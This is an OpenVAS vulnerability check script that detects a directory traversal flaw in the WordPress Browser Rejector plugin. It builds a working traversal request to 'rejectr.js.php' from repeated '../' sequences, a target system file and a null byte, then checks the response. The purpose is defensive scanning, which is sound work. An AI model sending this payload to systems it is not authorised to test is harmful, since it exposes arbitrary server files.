###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_browser_rejector_plugin_rfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WordPress Browser Rejector Plugin Remote File Inclusion Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";

tag_summary = "This host is installed with WordPress Browser Rejector Plugin and is prone
  to remote file inclusion vulnerability.";
tag_solution = "Upgrade to the WordPress Browser Rejector Plugin 2.11 or later,
  For updates refer to http://wordpress.org/extend/plugins/browser-rejector/";
tag_insight = "The flaw is due to an improper validation of user supplied input to the
  'wppath' parameter in 'wp-content/plugins/browser-rejector/rejectr.js.php',
  which allows attackers to read arbitrary files via a ../(dot dot) sequences.";
tag_affected = "Browser Rejector Plugin version 2.10 and prior";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803209";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7577 $");
  script_bugtraq_id(57220);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2013-01-17 14:17:27 +0530 (Thu, 17 Jan 2013)");
  script_name("WordPress Browser Rejector Plugin Remote File Inclusion Vulnerability");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/51739/");
  script_xref(name : "URL" , value : "http://plugins.trac.wordpress.org/changeset/648432/browser-rejector");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
wpPort = 0;
url = "";
dir = "";
files = "";

## Get HTTP Port
if(!wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:wpPort)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/wp-content/plugins/browser-rejector/rejectr.js.php?" +
                    "wppath=", crap(data:"../",length:3*15), files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:wpPort, url:url,pattern:file))
  {
    security_message(port:wpPort);
    exit(0);
  }
}
